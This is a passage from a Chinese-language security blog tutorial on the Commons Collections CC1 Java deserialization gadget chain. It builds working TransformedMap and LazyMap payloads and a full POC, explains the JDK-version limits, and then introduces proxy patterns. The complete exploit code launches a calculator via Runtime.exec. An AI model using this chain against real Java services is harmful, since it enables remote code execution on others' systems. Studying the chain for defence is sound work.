class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span>&#125;),<br>        &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        innerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span><br>            Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> construct.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(obj);<br>        oos.close();<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223569.png" alt="image-20230111153631865"> </p><p>出现异常</p><p>原因是，Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实现了 java.io.Serializable 接口。而我们最早传给ConstantTransformer的是Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接口的，所以不允许被序列化。</p><p>我们可以通过反射来获取到当前上下文中的Runtime对象，而不需要直接使用这个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) f.invoke(<span class="hljs-literal">null</span>);<br>r.exec(<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);<br></code></pre></td></tr></table></figure><p>转化为transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> &#125;),<br>        &#125;;<br></code></pre></td></tr></table></figure><blockquote><p>解释一下这一段代码，Transformer就可以理解为回调函数，在<code>new ConstantTransformer(Runtime.class)</code>以后返回Runtime，传给下一个参数，接着再调用Runtime的getMethod方法，在调用getname方法，依次类推，最后成功弹出计算器</p></blockquote><p>demo是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>&#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),&#125;;<br></code></pre></td></tr></table></figure><p>再列一下InvokerTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[]</span><br><span class="hljs-params">args)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iMethodName = methodName;<span class="hljs-comment">//方法名</span><br> iParamTypes = paramTypes;<span class="hljs-comment">//参数类型</span><br> iArgs = args;<span class="hljs-comment">//参数列表</span><br>&#125;<br></code></pre></td></tr></table></figure><p>先解释一下为什么new Class[0]和new Object[0]都是0，而不可以用其他的数字，例如1</p><blockquote><p>0是因为表示数组长度为零，用来表示方法或者函数是没有参数的</p><p>如果你使用new Class[1]和new Object[1]，将会是数组长度为1，第一个元素为null，但是在这个例子中，方法或函数是没有参数的，所以使用长度为0的数组更合适。</p><p>如果你传入长度为1的数组，那么在方法调用的时候，会传入一个参数，这个参数是null，但是这个方法本身就没有参数，那么这个方法的调用将会失败。</p></blockquote><p>还有就是既然没有参数，为什么还要使用数组</p><blockquote><p>Java的反射机制要求调用方法或函数的参数必须是一个数组类型。如果你传入的不是数组类型，调用会抛出IllegalArgumentException。</p><p>上面的demo中, new Class[0] 和 new Object[0] 都是长度为0的数组，它们的目的是告诉反射系统要调用的方法或函数没有参数。</p></blockquote><p>其实和demo最大的区别就是将 Runtime.getRuntime() 换成了 Runtime.class ，前者是一个java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。</p><h3 id="仍无法弹出计算器"><a href="#仍无法弹出计算器" class="headerlink" title="仍无法弹出计算器"></a>仍无法弹出计算器</h3><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224949.png" alt="image-20230111165817497"> </p><p>这次输出了序列化以后的数据流，但是却没有弹出计算器</p><p>这个实际上和<code>AnnotationInvocationHandler</code>类的逻辑有关，我们可以动态调试就会发现，在<code>AnnotationInvocationHandler:readObject</code> 的逻辑中，有一个if语句对var7进行判断，只有在其不是null的时候才会进入里面执行setValue，否则不会进入也就不会触发漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224750.png" alt="image-20230111171700832"> </p><p>那么如何让这个var7不为null呢？这直接给出两个条件：</p><ol><li><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</p></li><li><p>被 <code>TransformedMap.decorate</code> 修饰的Map中必须有一个键名为X的元素</p></li></ol><p>所以，这也解释了为什么我前面用到 Retention.class ，因为Retention有一个方法，名为value；所以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">innerMap.<span class="hljs-keyword">put</span>(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="Java-高版本不能利用的原因"><a href="#Java-高版本不能利用的原因" class="headerlink" title="Java 高版本不能利用的原因"></a>Java 高版本不能利用的原因</h3><p>因为Java官方修改了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code></p><p>对于这次修改，有些文章说是因为没有了setValue，其实原因和setValue关系不大。改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。</p><p>所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们这一章将上一章给出的demo扩展成为了一个真实可利用的POC，完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span> &#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        innerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> construct.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(obj);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;)<br></code></pre></td></tr></table></figure><p>拿这段代码距离说明getMethod后面那一堆参数的作用</p><p>第一个参数是字符串 <code>&quot;getMethod&quot;</code>，表示要调用目标对象的 <code>getMethod</code> 方法。</p><p>第二个参数是一个 <code>Class</code> 对象数组，它表示 <code>getMethod</code> 方法的参数类型。这里的 <code>Class[]</code> 表示一个 <code>Class</code> 类型的数组。数组中的第一个元素是 <code>String.class</code>，表示要查找的方法名为字符串类型。数组中的第二个元素是 <code>Class[].class</code>，表示要查找的方法的参数类型为 <code>Class</code> 类型的数组。</p><p>第三个参数是一个 <code>Object</code> 对象数组，它表示 <code>getMethod</code> 方法的参数值。这里数组第二个参数new Class[0]是<code>getRuntime</code>的参数，因为是Class[0]，表示<code>getRuntime</code>没有任何参数</p><p>由于 <code>getMethod</code> 方法是通过反射来查找目标方法的，因此需要指定要查找的方法名和参数类型。如果方法没有任何参数，那么就需要传入一个空的 <code>Class</code> 数组。</p></blockquote><p>但是这个payload存在局限性，必须再8u71以前的版本使用</p><h2 id="yso官方的CC1"><a href="#yso官方的CC1" class="headerlink" title="yso官方的CC1"></a>yso官方的CC1</h2><p>在ysoserial中，他使用的是一个lazyMap，而没有使用TransformedMap</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span> lazyMap = LazyMap.decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>这个官方的写法其实并不是为了解决高版本无法利用的问题，主要的问题其实在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类上</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承AbstractMapDecorator。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>, Serializable &#123;<br></code></pre></td></tr></table></figure><p>LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 factory.transform 。其实这也好理解，LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br><span class="hljs-comment">// create value for key if key is not currently in the map</span><br><span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>map.put(key, value);<br><span class="hljs-keyword">return</span> value;<br>&#125;<br><span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是相比于TransformedMap的利用方法，LazyMap后续利用稍微复杂一些，原因是在<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的readObject方法中并没有直接调用到Map的get方法。</p><p>所以ysoserial找到了另一条路，<code>AnnotationInvocationHandler</code>类的invoke方法有调用到get：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224742.png" alt="image-20230129144014934"> </p><p>那么又如何能调用到 <code>AnnotationInvocationHandler#invoke</code> 呢？ysoserial的作者想到的是利用Java的对象代理</p><h3 id="Java对象代理"><a href="#Java对象代理" class="headerlink" title="Java对象代理"></a>Java对象代理</h3><p>代理模式是一种设计模式，提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</p><p>简言之，代理模式就是设置一个中间代理来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。</p><blockquote><p>代理模式UML类图</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224203.png" alt="代理模式UML类图"> </p><p>举个例子，我们生活中经常到火车站去买车票，但是人一多的话，就会非常拥挤，于是就有了代售点，我们能从代售点买车票了。这其中就是代理模式的体现，代售点代理了火车站对象，提供购买车票的方法。</p><h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><p>这种代理方式需要代理对象和目标对象实现一样的接口。</p><p>优点：可以在不修改目标对象的前提下扩展目标对象的功能。</p><p>缺点：</p><ol><li>冗余。由于代理对象要实现与目标对象一致的接口，会产生过多的代理类。</li><li>不易维护。一旦接口增加方法，目标对象与代理对象都要进行修改。</li></ol><blockquote><p>举例：保存用户功能的静态代理实现</p></blockquote><ul><li>接口类： IUserDao</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUserDao</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>目标对象：UserDao</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUserDao</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;保存数据&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>静态代理对象：UserDaoProxy 需要实现IUserDao接口！</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUserDao</span>&#123;<br><br>    <span class="hljs-keyword">private</span> IUserDao target;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDaoProxy</span><span class="hljs-params">(IUserDao target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;开启事务&quot;</span>);<span class="hljs-comment">//扩展了额外功能</span><br>        target.save();<br>        System.out.println(<span class="hljs-string">&quot;提交事务&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>测试类：TestProxy</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticUserProxy</span> &#123;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStaticProxy</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//目标对象</span><br>        <span class="hljs-type">IUserDao</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDao</span>();<br>        <span class="hljs-comment">//代理对象</span><br>        <span class="hljs-type">UserDaoProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDaoProxy</span>(target);<br>        proxy.save();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//简单来说就是新建一个目标对象，把目标对象作为参数丢进代理对象中</span><br></code></pre></td></tr></table></figure><ul><li>输出结果</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">开启事务<br>保存数据<br>提交事务<br></code></pre></td></tr></table></figure><h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><p>动态代理利用了<a href="https://link.segmentfault.com/?enc=0DvEOM6+WbPHykSMZ3c9tw==.EnFrCzt+OrTJn/GXSH2XJyN/gyfaZapKyYfhWUdEU0a1yL5nQZ2PVg45dTaZ4k3b">JDK API</a>，动态地在内存中构建代理对象，从而实现对目标对象的代理功能。动态代理又被称为JDK代理或接口代理。</p><p>静态代理与动态代理的区别主要在：</p><ul><li>静态代理在编译时就已经实现，编译完成后代理类是一个实际的class文件</li><li>动态代理是在运行时动态生成的，即编译完成后没有实际的class文件，而是在运行时动态生成类字节码，并加载到JVM中</li></ul><p><strong>特点：</strong><br>动态代理对象不需要实现接口，但是要求目标对象必须实现接口，否则不能使用动态代理。</p><p>JDK中生成代理对象主要涉及的类有</p><ul><li><a href="https://link.segmentfault.com/?enc=y1H+t4YvPYIgKTKhETotyQ==.pbWU0z2U5LjTUKeB9I19XxYYeP1MtOIjsWu7gFSphM1exXUnhbEOfkA45krUPF4Ge5FZHGqsjJyv18pXSO9y+hd+j4DqxdI1MhDaQGORfy0=">java.lang.reflect Proxy</a>，主要方法为</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> Object    <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,  //指定当前目标对象使用类加载器</span><br><span class="hljs-params"></span><br><span class="hljs-params"> Class&lt;?&gt;[] interfaces,    //目标对象实现的接口的类型</span><br><span class="hljs-params"> InvocationHandler h      //事件处理器</span><br><span class="hljs-params">)</span> <br><span class="hljs-comment">//返回一个指定接口的代理类实例，该接口可以将方法调用指派到指定的调用处理程序。</span><br></code></pre></td></tr></table></figure><ul><li><a href="https://link.segmentfault.com/?enc=rLH60PciGYcYxqIkPdyeEg==.WpgwFGLNpJiqL9CTqZ9cuePBmZDI+jqGbnHwT6B3vVQc3TDic16OuMfQkRkvUMpYf/tNZiM10MlDNIlwdaugRhHxjbKdV8XwpHZcw12XqZzR43kCwb7fqlZJHQDbc3Xd">java.lang.reflect InvocationHandler</a>，主要方法为</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"> Object    <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <br><span class="hljs-comment">// 在代理实例上处理方法调用并返回结果。</span><br></code></pre></td></tr></table></figure><blockquote><p>举例：保存用户功能的动态代理实现</p></blockquote><ul><li>接口类： IUserDao</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> 